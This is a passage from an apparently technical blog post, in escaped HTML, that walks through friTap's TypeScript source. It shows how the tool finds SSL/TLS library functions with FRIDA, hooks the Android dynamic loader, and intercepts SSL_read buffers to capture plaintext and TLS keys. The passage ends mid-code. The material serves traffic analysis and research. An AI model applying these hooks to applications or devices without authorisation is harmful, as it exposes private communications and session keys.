}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isiOS&lt;/span>()){
&lt;span style="color:#a6e22e">load_ios_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isMacOS&lt;/span>()){
&lt;span style="color:#a6e22e">load_macos_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Error: not supported plattform!\nIf you want to have support for this plattform please make an issue at our github page.&amp;#34;&lt;/span>)
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This agent installs the hooks for the detected libraries. First the enumerations of the supported SSL/TLS libaries are safed (&lt;code>module_library_mapping&lt;/code>) and provided for the different hooks. In the following we see how this is done for Android:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">load_android_hooking_agent&lt;/span>() {
&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>[&lt;span style="color:#a6e22e">plattform_name&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [[&lt;span style="color:#e6db74">/.*libssl_sb.so/&lt;/span>, &lt;span style="color:#a6e22e">boring_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libssl\.so/&lt;/span>, &lt;span style="color:#a6e22e">boring_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libgnutls\.so/&lt;/span>, &lt;span style="color:#a6e22e">gnutls_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libwolfssl\.so/&lt;/span>, &lt;span style="color:#a6e22e">wolfssl_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libnspr[0-9]?\.so/&lt;/span>,&lt;span style="color:#a6e22e">nss_execute&lt;/span>], [&lt;span style="color:#e6db74">/libmbedtls\.so.*/&lt;/span>, &lt;span style="color:#a6e22e">mbedTLS_execute&lt;/span>]];
&lt;span style="color:#a6e22e">install_java_hooks&lt;/span>();
&lt;span style="color:#a6e22e">hook_native_Android_SSL_Libs&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>);
&lt;span style="color:#a6e22e">hook_Android_Dynamic_Loader&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If supported, friTap installs java based hooks. Right now these java hooks only installed for Android applications. Next the plattform (operating system) specific hooks are installed. After a supported SSL/TLS library has been found, the search for the corresponding functions (read, write, key export) inside the module is started. This is done using the mapped functions from &lt;code>module_library_mapping&lt;/code>. When we have a closer look into the enumerations we can see that for each detected library an appropriate so called &lt;code>&amp;lt;libname&amp;gt;-execute&lt;/code> function is mapped. This mapped function contains the implementation details of the &lt;code>SSL-read()&lt;/code>, &lt;code>SSL-write()&lt;/code> and &lt;code>SSL-keyexport()&lt;/code> hooks. Strictly speaking, for each identified library, its platform-specific hook (read, write, export) is installed for the corresponding library. Fortunately, the majority of hooking implementations are platform independent, with only a few platforms having differences. This means that the overall hooking implementation for a specific library is provided by an os independent super class. In the following we see the Android OpenSSL hooking implementation with the implementations inherited from its superclass:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* from openssl_boringssl_android.ts */&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL_Android&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL&lt;/span> {
&lt;span style="color:#a6e22e">constructor&lt;/span>(&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String, &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String){
&lt;span style="color:#66d9ef">super&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>,&lt;span style="color:#a6e22e">socket_library&lt;/span>);
}
&lt;span style="color:#a6e22e">execute_hooks&lt;/span>(){
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_plaintext_read_hook&lt;/span>();
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_plaintext_write_hook&lt;/span>();
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_tls_keys_callback_hook&lt;/span>();
}
}
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">boring_execute&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String){
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">boring_ssl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL_Android&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>,&lt;span style="color:#a6e22e">socket_library&lt;/span>);
&lt;span style="color:#a6e22e">boring_ssl&lt;/span>.&lt;span style="color:#a6e22e">execute_hooks&lt;/span>();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The specific functions of the library are only then hooked in the superclass. This is done by library&amp;rsquo;s specific function names (SSL_read, SSL_write&amp;hellip;) which are passed to our &lt;code>readAddresses()&lt;/code> function in order to obtain the addresses for hooking.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* super class openssl_boringssl.ts */&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL&lt;/span> {
&lt;span style="color:#75715e">// global variables
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">library_method_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {};
&lt;span style="color:#a6e22e">addresses&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> };
...
&lt;span style="color:#a6e22e">constructor&lt;/span>(&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String, &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String,&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span>&lt;span style="color:#f92672">?:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> }){
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#66d9ef">typeof&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;undefined&amp;#39;&lt;/span>){
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span>;
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#e6db74">`*&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">*`&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_get_fd&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_get_session&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_SESSION_get_id&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_new&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_keylog_callback&amp;#34;&lt;/span>]
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#e6db74">`*&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">*`&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;getpeername&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getsockname&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;ntohs&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;ntohl&amp;#34;&lt;/span>]
}
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">addresses&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">readAddresses&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>);
...
}
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>FRIDA provides with the &lt;a href="https://frida.re/docs/javascript-api/#apiresolver">ApiResolver&lt;/a> a function &lt;code>enumerateMatches(&amp;quot;exports:&amp;quot; + library_name + &amp;quot;!&amp;quot; + method)&lt;/code>:
This is passed the name of the function, the name of the module and the type (export, import) in a single string. If a match is found, information about this function is returned, of which friTap only needs and stores the address. Below is the whole listing of friTap&amp;rsquo;s &lt;code>readAddresses()&lt;/code> function:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">//File: agent/shared/shared_functions.ts
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e">* Read the addresses for the given methods from the given modules
&lt;/span>&lt;span style="color:#75715e">* @param {{[key: string]: Array&amp;lt;String&amp;gt; }} library_method_mapping A string indexed list of arrays, mapping modules to methods
&lt;/span>&lt;span style="color:#75715e">* @return {{[key: string]: NativePointer }} A string indexed list of NativePointers, which point to the respective methods
&lt;/span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">readAddresses&lt;/span>(&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> })&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> } {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">resolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ApiResolver&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;module&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">addresses&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {}
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#66d9ef">in&lt;/span> &lt;span style="color:#a6e22e">library_method_mapping&lt;/span>) {
&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#a6e22e">library_name&lt;/span>].&lt;span style="color:#a6e22e">forEach&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">method&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">enumerateMatches&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;exports:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;!&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>)
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">match_number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">method_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>();
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>)){
&lt;span style="color:#a6e22e">method_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Could not find &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;!&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>
}
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>){
&lt;span style="color:#a6e22e">devlog&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Found &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>)
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">k&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">k&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#a6e22e">k&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>].&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#a6e22e">method_name&lt;/span>)){
&lt;span style="color:#a6e22e">match_number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">k&lt;/span>;
&lt;span style="color:#a6e22e">devlog&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Found &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">match_number&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>)
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
}
&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#a6e22e">method_name&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">match_number&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>;
})
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">addresses&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After all relevant function addresses are available, friTap finally installs the hooks when entering or leaving the respective functions. More on this later.&lt;/p>
&lt;p>It is possible that a program to be analyzed does not load an SSL/TLS library at program start or loads an SSL/TLS library again at another time. For this case friTap hooks a function in the respective standard library of the operating system. The following is the implementation for Android:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* File agent/android/android_agent.ts */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">hook_Android_Dynamic_Loader&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>[&lt;span style="color:#a6e22e">any&lt;/span>, (&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>)=&amp;gt;&lt;span style="color:#66d9ef">void&lt;/span>]&lt;span style="color:#f92672">&amp;gt;&lt;/span> })&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span>{
...
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">regex_libdl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">/.*libdl.*\.so/&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">libdl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">moduleNames&lt;/span>.&lt;span style="color:#a6e22e">find&lt;/span>(&lt;span style="color:#a6e22e">element&lt;/span> =&amp;gt; &lt;span style="color:#a6e22e">element&lt;/span>.&lt;span style="color:#a6e22e">match&lt;/span>(&lt;span style="color:#a6e22e">regex_libdl&lt;/span>))
...
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">dl_exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Process&lt;/span>.&lt;span style="color:#a6e22e">getModuleByName&lt;/span>(&lt;span style="color:#a6e22e">libdl&lt;/span>).&lt;span style="color:#a6e22e">enumerateExports&lt;/span>()
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">dlopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dlopen&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ex&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">dl_exports&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">ex&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android_dlopen_ext&amp;#34;&lt;/span>) {
&lt;span style="color:#a6e22e">dlopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android_dlopen_ext&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>
}
}
&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">Module&lt;/span>.&lt;span style="color:#a6e22e">getExportByName&lt;/span>(&lt;span style="color:#a6e22e">libdl&lt;/span>, &lt;span style="color:#a6e22e">dlopen&lt;/span>), {
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>) {
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">readCString&lt;/span>()
},
&lt;span style="color:#a6e22e">onLeave&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span>) {
&lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">module_library_mapping&lt;/span>[&lt;span style="color:#a6e22e">plattform_name&lt;/span>]){
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">regex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">regex&lt;/span>.&lt;span style="color:#a6e22e">test&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>)){
&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">`&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> was loaded &amp;amp; will be hooked on Android!`&lt;/span>)
&lt;span style="color:#a6e22e">func&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>)
}
}
}
}
})
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">`[*] Android dynamic loader hooked.`&lt;/span>)
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now all functions for extracting the streams or the key material should have been identified so that friTap can use the hooks for extracting the plaintext payload or the TLS keys.&lt;/p>
&lt;p>Lets dive into the hooking implementations itself. The way of instrumentation varies partly between the different supported libraries and plattform, but all follow the same principle.&lt;/p>
&lt;h3 id="hooking-the-read-function">Hooking the read function&lt;/h3>
&lt;p>The read functions of the libraries generally have function signature of the following structure:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first parameter is a pointer to an SSL object that holds all information about the SSL session in use in the background. This object is used to identify the SSL/TLS stream over which data is received. The second parameter is a pointer to a temporary buffer that holds unencrypted data received from the SSL/TLS stream. The third parameter is the maximum number of bytes that can be stored in the buffer for data received from the SSL/TLS stream.&lt;/p>
&lt;p>For friTap, the second parameter, the buffer containing the unencrypted data, is the important one. To read the contents of this buffer, friTap needs the pointer to it and the number of bytes that were received.
FRIDA&amp;rsquo;s interceptor allows to define hooks for function start and end. These callbacks are executed before the execution and after the execution of the function.
The callback function for the hook of the function start is passed all parameters of the hooked function. Thus the callback function is able to extract and manipulate all passed parameters.
friTap takes advantage of this and extracts from the parameters the second pointer of the read function, which points to the buffer that holds the received, unencrypted data. The implementation is here as an example (using OpenSSL) for the other implementations and it looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>],
{
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getPortsAndAddresses&lt;/span>(&lt;span style="color:#a6e22e">SSL_get_fd&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#a6e22e">as&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#a6e22e">addresses&lt;/span>)
